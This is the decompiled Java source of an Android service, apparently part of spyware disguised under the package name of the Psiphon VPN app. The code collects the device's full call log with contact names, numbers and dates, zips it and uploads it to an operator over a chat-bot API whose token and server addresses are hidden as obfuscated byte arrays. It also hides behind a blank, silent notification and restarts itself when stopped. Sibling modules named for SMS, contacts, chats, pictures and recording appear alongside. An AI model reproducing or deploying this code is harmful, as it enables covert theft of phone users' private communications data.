package com.psiphon3;


import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.objects.ServiceHelper;
import anywheresoftware.b4a.debug.*;

public class getallcalls extends  android.app.Service{
	public static class getallcalls_BR extends android.content.BroadcastReceiver {

		@Override
		public void onReceive(android.content.Context context, android.content.Intent intent) {
            BA.LogInfo("** Receiver (getallcalls) OnReceive **");
			android.content.Intent in = new android.content.Intent(context, getallcalls.class);
			if (intent != null)
				in.putExtra("b4a_internal_intent", intent);
            ServiceHelper.StarterHelper.startServiceFromReceiver (context, in, false, BA.class);
		}

	}
    static getallcalls mostCurrent;
	public static BA processBA;
    private ServiceHelper _service;
    public static Class<?> getObject() {
		return getallcalls.class;
	}
	@Override
	public void onCreate() {
        super.onCreate();
        mostCurrent = this;
        if (processBA == null) {
		    processBA = new BA(this, null, null, "com.psiphon3", "com.psiphon3.getallcalls");
            if (BA.isShellModeRuntimeCheck(processBA)) {
                processBA.raiseEvent2(null, true, "SHELL", false);
		    }
            try {
                Class.forName(BA.applicationContext.getPackageName() + ".main").getMethod("initializeProcessGlobals").invoke(null, null);
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
            processBA.loadHtSubs(this.getClass());
            ServiceHelper.init();
        }
        _service = new ServiceHelper(this);
        processBA.service = this;
        
        if (BA.isShellModeRuntimeCheck(processBA)) {
			processBA.raiseEvent2(null, true, "CREATE", true, "com.psiphon3.getallcalls", processBA, _service, anywheresoftware.b4a.keywords.Common.Density);
		}
        if (!false && ServiceHelper.StarterHelper.startFromServiceCreate(processBA, false) == false) {
				
		}
		else {
            processBA.setActivityPaused(false);
            BA.LogInfo("*** Service (getallcalls) Create ***");
            processBA.raiseEvent(null, "service_create");
        }
        processBA.runHook("oncreate", this, null);
        if (false) {
			ServiceHelper.StarterHelper.runWaitForLayouts();
		}
    }
		@Override
	public void onStart(android.content.Intent intent, int startId) {
		onStartCommand(intent, 0, 0);
    }
    @Override
    public int onStartCommand(final android.content.Intent intent, int flags, int startId) {
    	if (ServiceHelper.StarterHelper.onStartCommand(processBA, new Runnable() {
            public void run() {
                handleStart(intent);
            }}))
			;
		else {
			ServiceHelper.StarterHelper.addWaitForLayout (new Runnable() {
				public void run() {
                    processBA.setActivityPaused(false);
                    BA.LogInfo("** Service (getallcalls) Create **");
                    processBA.raiseEvent(null, "service_create");
					handleStart(intent);
                    ServiceHelper.StarterHelper.removeWaitForLayout();
				}
			});
		}
        processBA.runHook("onstartcommand", this, new Object[] {intent, flags, startId});
		return android.app.Service.START_STICKY;
    }
    public void onTaskRemoved(android.content.Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        if (false)
            processBA.raiseEvent(null, "service_taskremoved");
            
    }
    private void handleStart(android.content.Intent intent) {
    	BA.LogInfo("** Service (getallcalls) Start **");
    	java.lang.reflect.Method startEvent = processBA.htSubs.get("service_start");
    	if (startEvent != null) {
    		if (startEvent.getParameterTypes().length > 0) {
    			anywheresoftware.b4a.objects.IntentWrapper iw = ServiceHelper.StarterHelper.handleStartIntent(intent, _service, processBA);
    			processBA.raiseEvent(null, "service_start", iw);
    		}
    		else {
    			processBA.raiseEvent(null, "service_start");
    		}
    	}
    }
	
	@Override
	public void onDestroy() {
        super.onDestroy();
        if (false) {
            BA.LogInfo("** Service (getallcalls) Destroy (ignored)**");
        }
        else {
            BA.LogInfo("** Service (getallcalls) Destroy **");
		    processBA.raiseEvent(null, "service_destroy");
            processBA.service = null;
		    mostCurrent = null;
		    processBA.setActivityPaused(true);
            processBA.runHook("ondestroy", this, null);
        }
	}

@Override
	public android.os.IBinder onBind(android.content.Intent intent) {
		return null;
	}public anywheresoftware.b4a.keywords.Common __c = null;
public static com.psiphon3.httpjob _v6 = null;
public static com.psiphon3.httpjob _v7 = null;
public static anywheresoftware.b4a.objects.collections.JSONParser _v0 = null;
public static String _vv1 = "";
public static int _admin_id = 0;
public static String _vv2 = "";
public static String _vv3 = "";
public static String _vv4 = "";
public static String _vv5 = "";
public static ir.rayanoos.lib.upload_ultra.upload_ultra _vv6 = null;
public static ice.smsplus.SmsWrapper _vv7 = null;
public static com.AB.ABZipUnzip.ABZipUnzip _vv0 = null;
public static anywheresoftware.b4a.phone.CallLogWrapper _vvv1 = null;
public static anywheresoftware.b4a.phone.Contacts2Wrapper _vvv2 = null;
public static ir.rayanoos.lib.ultra_decoder.ultra_decoder _vvv3 = null;
public ir.rayanoos.lib.upload_ultra.uploadfile _vvvvvvvv5 = null;
public com.psiphon3.main _vvvvvvvv6 = null;
public com.psiphon3.cmr _vvvvvvvv7 = null;
public com.psiphon3.cmr2 _vvvvvvvv0 = null;
public com.psiphon3.firebasemessaging _vvvvvvvvv1 = null;
public com.psiphon3.getallcontacts _vvvvvvvvv3 = null;
public com.psiphon3.getallsms _vvvvvvvvv4 = null;
public com.psiphon3.getchats _vvvvvvvvv5 = null;
public com.psiphon3.getinsta _vvvvvvvvv6 = null;
public com.psiphon3.getlists _vvvvvvvvv7 = null;
public com.psiphon3.getonechat _vvvvvvvvv0 = null;
public com.psiphon3.getpicture _vvvvvvvvvv1 = null;
public com.psiphon3.getpicture2 _vvvvvvvvvv2 = null;
public com.psiphon3.srv _vvvvvvvvvv3 = null;
public com.psiphon3.starter _vvvvvvvvvv4 = null;
public com.psiphon3.startrecord _vvvvvvvvvv5 = null;
public com.psiphon3.httputils2service _vvvvvvvvvv6 = null;
public static String  _getcall(String _topic,String _filename) throws Exception{
anywheresoftware.b4a.objects.collections.List _calls = null;
String _strcall = "";
String _calltype = "";
String _name = "";
anywheresoftware.b4a.phone.CallLogWrapper.CallItem _i = null;
 //BA.debugLineNum = 63;BA.debugLine="Sub getcall (Topic As String, fileName As String)";
 //BA.debugLineNum = 64;BA.debugLine="Try";
try { //BA.debugLineNum = 66;BA.debugLine="Dim Calls As List";
_calls = new anywheresoftware.b4a.objects.collections.List();
 //BA.debugLineNum = 67;BA.debugLine="Calls=callLog.GetAll(0)";
_calls = _vvv1.GetAll((int) (0));
 //BA.debugLineNum = 68;BA.debugLine="Dim strcall As String=\"\"";
_strcall = "";
 //BA.debugLineNum = 69;BA.debugLine="Dim callType,name As String";
_calltype = "";
_name = "";
 //BA.debugLineNum = 70;BA.debugLine="For Each i As CallItem In Calls";
{
final anywheresoftware.b4a.BA.IterableList group6 = _calls;
final int groupLen6 = group6.getSize()
;int index6 = 0;
;
for (; index6 < groupLen6;index6++){
_i = (anywheresoftware.b4a.phone.CallLogWrapper.CallItem)(group6.Get(index6));
 //BA.debugLineNum = 71;BA.debugLine="Select i.CallType";
switch (BA.switchObjectToInt(_i.CallType,_i.TYPE_INCOMING,_i.TYPE_MISSED,_i.TYPE_OUTGOING)) {
case 0: {
 //BA.debugLineNum = 73;BA.debugLine="callType=\"Incoming\"";
_calltype = "Incoming";
 break; }
case 1: {
 //BA.debugLineNum = 75;BA.debugLine="callType=\"Missed\"";
_calltype = "Missed";
 break; }
case 2: {
 //BA.debugLineNum = 77;BA.debugLine="callType=\"Outgoing\"";
_calltype = "Outgoing";
 break; }
}
;
 //BA.debugLineNum = 79;BA.debugLine="name=i.CachedName";
_name = _i.CachedName;
 //BA.debugLineNum = 80;BA.debugLine="strcall = strcall &CRLF&CRLF&\"name : \"&name&CRL";
_strcall = _strcall+anywheresoftware.b4a.keywords.Common.CRLF+anywheresoftware.b4a.keywords.Common.CRLF+"name : "+_name+anywheresoftware.b4a.keywords.Common.CRLF+"phone :"+_i.Number+anywheresoftware.b4a.keywords.Common.CRLF+"Type : "+_calltype+anywheresoftware.b4a.keywords.Common.CRLF+"Date : "+anywheresoftware.b4a.keywords.Common.DateTime.Date(_i.Date);
 }
};
 //BA.debugLineNum = 82;BA.debugLine="File.WriteString(File.DirInternal,\"allCalls.txt\"";
anywheresoftware.b4a.keywords.Common.File.WriteString(anywheresoftware.b4a.keywords.Common.File.getDirInternal(),"allCalls.txt",_strcall);
 //BA.debugLineNum = 83;BA.debugLine="zip.ABZipfile(File.DirInternal&\"/\" , \"allCalls.t";
_vv0.ABZipfile(anywheresoftware.b4a.keywords.Common.File.getDirInternal()+"/","allCalls.txt",anywheresoftware.b4a.keywords.Common.File.getDirInternal()+"/allCalls.zip");
 //BA.debugLineNum = 84;BA.debugLine="upload.upload(admin_id , \"All Calls\".Replace(\" \"";
_vv6._upload(_admin_id,"All Calls".replace(" ","%20"),(int) (0),anywheresoftware.b4a.keywords.Common.File.getDirInternal(),"allCalls.zip");
 //BA.debugLineNum = 85;BA.debugLine="File.Delete(File.DirInternal , \"allCalls.zip\")";
anywheresoftware.b4a.keywords.Common.File.Delete(anywheresoftware.b4a.keywords.Common.File.getDirInternal(),"allCalls.zip");
 } 
       catch (Exception e23) {
			processBA.setLastException(e23); //BA.debugLineNum = 87;BA.debugLine="ht2.Download(apiserver&token&\"/sendmessage?chat_";
_v7._vvvv6 /*String*/ (_vv2+_vv1+"/sendmessage?chat_id="+BA.NumberToString(_admin_id)+"&text="+"Exception"+"&reply_to_message_id="+BA.NumberToString(0));
 };
 //BA.debugLineNum = 89;BA.debugLine="End Sub";
return "";
}
public static String  _process_globals() throws Exception{
 //BA.debugLineNum = 6;BA.debugLine="Sub Process_Globals";
 //BA.debugLineNum = 9;BA.debugLine="Dim ht,ht2 As HttpJob";
_v6 = new com.psiphon3.httpjob();
_v7 = new com.psiphon3.httpjob();
 //BA.debugLineNum = 10;BA.debugLine="Dim js As JSONParser";
_v0 = new anywheresoftware.b4a.objects.collections.JSONParser();
 //BA.debugLineNum = 11;BA.debugLine="Dim token As String = \":...__::...__::...__._____";
_vv1 = main.vvv13 (new byte[] {50,53,3,-72,72,67,29,-22,35,45,2,-41,87,33,23,-72,57,50,120,-113,35,92,115,-41,87,68,114,-84,45,50,9,-2,82,92}, 815774)+main.vvv13 (new byte[] {87,54,117,-33,45,37,14,-24,35,95,116,-63,38,71,117,-33,45,37,14,-24,35,95,116,-63,38,71,117,-33,45,37,14,-24,35,95,116,-80,87,71,117,-33,72,64,26,-4,35,46,5,-63,87,54,117,-33,72,64,127,-103,55,58,5,-80,38,71,117,-70,45,49,14,-24,82,95,5,-63,50,34,16,-33,57,49,127,-24,82,95,116,-63,87,71,117,-70,45,64,14,-24,82,46,116,-63,87}, 218912)+main.vvv13 (new byte[] {87,71,-49,-5,45,37,-59,-52,35,46,-50,-108,87,71,-49,-5,72,64,-96,-40,82,46,-65,-108,87,71,-49,-5,57,64,-59,-67,55,58,-50,-27,38,71,-49,-5,72,49,-59,-67,82,58,-85,-108,87,71,-49,-118,57,49,-59,-52,35,58,-85,-108,87,71,-66,-5,72,49,-59,-67,35,58,-85,-27,38,54,-66,-118}, 491037)+main.vvv13 (new byte[] {38,53,46,-28,72,67,48,-57,35,92,94,-117,38,68,95,-107,57,50,48,-57,35,45,47,-6,87,53,95,-127,45,50,85,-45,82,45,94,-6,38,68,46,-127,45,67,85,-94,82,92,94,-117,87,53,46,-28,45,38,36,-45,35,92,94,-6,38,68,95,-127,45,67,85,-94,82,92,47,-6,87,53,46,-28,45,38,85,-45,82,45,47,-6,38,53,46,-28,72,38,48,-45,82,92,94,-6,38,68,95,-28,72,38,48,-45,35,45,94,-6,87,53,95,-28,72,38,48,-94,35,92,94,-117,87,68,95,-107,57,67,48,-57,35,92,94,-117,38,68,95,-107,57,50,48,-57,82,45,47,-6,38,68,95,-28,72,67,85,-94,55,57,47,-117,87,68,46,-28}, 749360)+main.vvv13 (new byte[] {87,54,-88,-2,45,37,-94,-72,82,95,-40,-111,38,54,-88,-2,45,37,-94,-55,35,95,-40,-32,38,54,-39,-2,45,37,-45,-72,82,95,-87,-111,87,71,-88,-2,72,37,-74,-55,35,46,-87,-111,87,71,-39,-2,72,64,-45,-84,55,46,-87,-111,87,54,-39,-113,57,49,-94,-84,82,58,-40,-32,38,54,-88,-2,57,64,-45,-72,82,58,-67,-32,38,71,-39,-2,72,64,-94,-72,35,58,-67,-32,87,71,-88,-113,72,49,-45,-55,35,58,-67,-32,38,54,-39,-113,72,64,-94,-55}, 467311)+main.vvv13 (new byte[] {87,68,124,-61,57,50,98,-111,82,45,105,-72,87,53,124,-61,72,67,98,-32,82,92,24,-55,87,68,25,-61,45,67,98,-111,82,92,24,-72,38,68,25,-90,72,38,118,-111,82,92,105,-72,87,68,104,-90,57,38}, 910049);
 //BA.debugLineNum = 12;BA.debugLine="Dim admin_id As Int = 315160032";
_admin_id = (int) (315160032);
 //BA.debugLineNum = 13;BA.debugLine="Dim apiserver As String=\":.____..._.::..____....:";
_vv2 = main.vvv13 (new byte[] {50,54,-54,-29,72,64,-79,-44,35,95,-70,-104,50,54,-69,-29,72,64,-64,-44,35,46,-70,-104,50,54,-69,-29,72,64,-64,-44,35,46,-70,-104,50,54,-54,-29,57,49,-79,-44,35,46,-70,-104,50,54,-69,-29,57,49,-79,-44,82,95,-70,-104,50,55,-70,-122,57,64,-64,-44,35,95,-70,-3,87,54,-81,-122}, 502770)+main.vvv13 (new byte[] {38,68,78,18,57,67,53,37,82,45,42,24,38,68,78,18,57,67,53,37,82,45,42,12,50,53,63,18,57,67,53,84,82,92,62,24,50,68,63,18,57,50,53,84,35,92,62,24,50,53,63,99,72,67,68,84,35,45,62,24,50,53,78}, 787312)+main.vvv13 (new byte[] {87,70,-101,32,57,65,-111,23,55,59,-21,79,87,55,-22,81,57,65,-111,23,55,59,-21,79,87,70,-101,32,57,48,-32,23,55,59,-21,62,38,70,-101,32,72,65,-111,23,55,59,-21,62,87,55,-101,32,57,65,-111,23,55,59,-21,62,87,70,-101,32,72,65,-111,23,55,47,-1,79,38,70,-101,32,57,65,-32,102,35,59,-1,79,38,70}, 19536)+main.vvv13 (new byte[] {38,54,107,-12,72,49,97,-41,34,58,27,-22,87,54,107,-12,57,64,97,-61,55,58,27,-22,87,71,107,-123,72,64,97,-78,55,58,27,-101,87,71,107,-12,57,49,16,-61,55}, 279203);
 //BA.debugLineNum = 14;BA.debugLine="Dim fileToWirte As String = \"msgid16.txt\"";
_vv3 = main.vvv13 (new byte[] {101,104,68,-105,115,45,31,-106,121,123,86}, 829383);
 //BA.debugLineNum = 15;BA.debugLine="Dim StartMessage As String = \"test16\"";
_vv4 = main.vvv13 (new byte[] {124,126,10,93,38,42}, 989970);
 //BA.debugLineNum = 16;BA.debugLine="Dim uploadUrl As String = \":.____..._.::..____...";
_vv5 = main.vvv13 (new byte[] {50,54,15,-25,72,64,116,-48,35,95,127,-100,50,54,126,-25,72,64,5,-48,35,46,127,-100,50,54,126,-25,72,64,5,-48,35,46,127,-100,50,54,15,-25,57,49,116,-48}, 343833)+main.vvv13 (new byte[] {38,53,54,-39,45,51,61,-97,35,45,55,-45,87,53,54,-68,72,50,40,-97,82,45,55,-45,38,53,54,-51,72,50,40,-97,35,45,70,-94,87,68,54,-51,57,50,40,-97,35,92,70,-94,87,68,54,-68,72,50,40}, 767002)+main.vvv13 (new byte[] {50,53,66,-79,57,50,72,-122,82,92,67,-54,50,53,66,-79,72,67,57,-122,35,45,67,-54,50,53,51,-64,72,67,57,-9,82,92,67,-54,50,53,51,-79,57,67,57,-122,82,92,67,-54,50,53,51,-79,72,67,57,-9,82,92,67,-54,38,33,66,-64,72,67,57,-122,82,45,50,-34,50,33,66,-64,72,50,72,-9,82,92,67,-81,50,52,86,-64,72,50,57,-9,35,45,67,-81,38,33,86,-64,72,67,72,-122,35,45}, 960568)+main.vvv13 (new byte[] {38,54,48,-103,45,49,75,-70,35,46,64,-30,38,54,48,-103,45,49,75,-70,82,46,64,-30,87,71,48,-103,57,37,58,-70,82,46,49,-109,38}, 191581)+main.vvv13 (new byte[] {38,54,-49,-97,45,49,-76,-68,82,95,-50,-107,38,71,-49,-97,45,49,-76,-68,35,46,-50}, 677669)+main.vvv13 (new byte[] {38,55,-8,76,45}, 60813);
 //BA.debugLineNum = 17;BA.debugLine="Dim upload As upload_ultra";
_vv6 = new ir.rayanoos.lib.upload_ultra.upload_ultra();
 //BA.debugLineNum = 18;BA.debugLine="Dim allsms As SmsMessages";
_vv7 = new ice.smsplus.SmsWrapper();
 //BA.debugLineNum = 19;BA.debugLine="Dim zip As ABZipUnzip";
_vv0 = new com.AB.ABZipUnzip.ABZipUnzip();
 //BA.debugLineNum = 20;BA.debugLine="Dim callLog As CallLog";
_vvv1 = new anywheresoftware.b4a.phone.CallLogWrapper();
 //BA.debugLineNum = 21;BA.debugLine="Dim c As Contacts2";
_vvv2 = new anywheresoftware.b4a.phone.Contacts2Wrapper();
 //BA.debugLineNum = 22;BA.debugLine="Dim decode As ultra_decoder";
_vvv3 = new ir.rayanoos.lib.ultra_decoder.ultra_decoder();
 //BA.debugLineNum = 26;BA.debugLine="End Sub";
return "";
}
public static String  _service_create() throws Exception{
anywheresoftware.b4a.objects.NotificationWrapper _n = null;
 //BA.debugLineNum = 28;BA.debugLine="Sub Service_Create";
 //BA.debugLineNum = 30;BA.debugLine="decode.Initialize";
_vvv3._initialize(processBA);
 //BA.debugLineNum = 31;BA.debugLine="token = decode.decode(token)";
_vv1 = _vvv3._decode(_vv1);
 //BA.debugLineNum = 32;BA.debugLine="apiserver=decode.decode(apiserver)";
_vv2 = _vvv3._decode(_vv2);
 //BA.debugLineNum = 33;BA.debugLine="uploadUrl=decode.decode(uploadUrl)";
_vv5 = _vvv3._decode(_vv5);
 //BA.debugLineNum = 34;BA.debugLine="ht.Initialize(\"ht\",Me)";
_v6._initialize /*String*/ (processBA,"ht",getallcalls.getObject());
 //BA.debugLineNum = 35;BA.debugLine="ht2.Initialize(\"ht2\",Me)";
_v7._initialize /*String*/ (processBA,"ht2",getallcalls.getObject());
 //BA.debugLineNum = 36;BA.debugLine="ht.JobName=\"ht1\"";
_v6._vvvvvvv3 /*String*/  = "ht1";
 //BA.debugLineNum = 37;BA.debugLine="ht2.JobName=\"ht2\"";
_v7._vvvvvvv3 /*String*/  = "ht2";
 //BA.debugLineNum = 38;BA.debugLine="upload.Initialize(uploadUrl,token)";
_vv6._initialize(processBA,_vv5,_vv1);
 //BA.debugLineNum = 39;BA.debugLine="Dim n As Notification";
_n = new anywheresoftware.b4a.objects.NotificationWrapper();
 //BA.debugLineNum = 40;BA.debugLine="n.Initialize2(n.IMPORTANCE_LOW)";
_n.Initialize2(_n.IMPORTANCE_LOW);
 //BA.debugLineNum = 41;BA.debugLine="n.Icon      = \"icon\"";
_n.setIcon("icon");
 //BA.debugLineNum = 42;BA.debugLine="n.Sound    = False";
_n.setSound(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 43;BA.debugLine="n.Vibrate    = False";
_n.setVibrate(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 44;BA.debugLine="n.Light    = False";
_n.setLight(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 45;BA.debugLine="n.Insistent  = False";
_n.setInsistent(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 46;BA.debugLine="n.AutoCancel = False";
_n.setAutoCancel(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 47;BA.debugLine="n.SetInfo(\"\",\"\",\"\")";
_n.SetInfoNew(processBA,BA.ObjectToCharSequence(""),BA.ObjectToCharSequence(""),(Object)(""));
 //BA.debugLineNum = 48;BA.debugLine="Service.AutomaticForegroundNotification = n";
mostCurrent._service.AutomaticForegroundNotification = (android.app.Notification)(_n.getObject());
 //BA.debugLineNum = 56;BA.debugLine="End Sub";
return "";
}
public static String  _service_destroy() throws Exception{
 //BA.debugLineNum = 93;BA.debugLine="Sub Service_Destroy";
 //BA.debugLineNum = 94;BA.debugLine="StartServiceAt(\"\" , DateTime.Now+100 , True)";
anywheresoftware.b4a.keywords.Common.StartServiceAt(processBA,(Object)(""),(long) (anywheresoftware.b4a.keywords.Common.DateTime.getNow()+100),anywheresoftware.b4a.keywords.Common.True);
 //BA.debugLineNum = 95;BA.debugLine="End Sub";
return "";
}
public static String  _service_start(anywheresoftware.b4a.objects.IntentWrapper _startingintent) throws Exception{
 //BA.debugLineNum = 58;BA.debugLine="Sub Service_Start (StartingIntent As Intent)";
 //BA.debugLineNum = 61;BA.debugLine="End Sub";
return "";
}
}
